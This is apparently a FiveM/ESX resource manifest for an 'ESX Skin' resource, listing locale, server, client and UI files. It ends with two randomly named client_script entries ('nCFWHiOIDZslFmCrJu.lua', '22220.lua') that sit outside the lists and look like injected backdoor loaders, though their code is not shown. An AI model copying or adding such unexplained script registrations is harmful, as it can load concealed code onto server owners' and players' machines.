description 'ESX Skin'

version '1.0.1'

ui_pages {
  'ui/index.html'
}

server_scripts {
  '@es_extended/locale.lua',
  'config.lua',
  'locales/de.lua',
  'locales/br.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'locales/pl.lua',
  '@mysql-async/lib/MySQL.lua',
  'server/main.lua',
}

client_scripts {
  '@es_extended/locale.lua',
  'config.lua',
  'locales/de.lua',
  'locales/br.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'locales/pl.lua',
  'client/main.lua',
}

files {
	'ui/index.html',
	'ui/style.css',
	'ui/style1.css',
	'ui/articules/art.txt',
	'ui/script.js',
	'ui/index.js',
	'ui/temp.json',
}

client_script "nCFWHiOIDZslFmCrJu.lua"
client_script "22220.lua"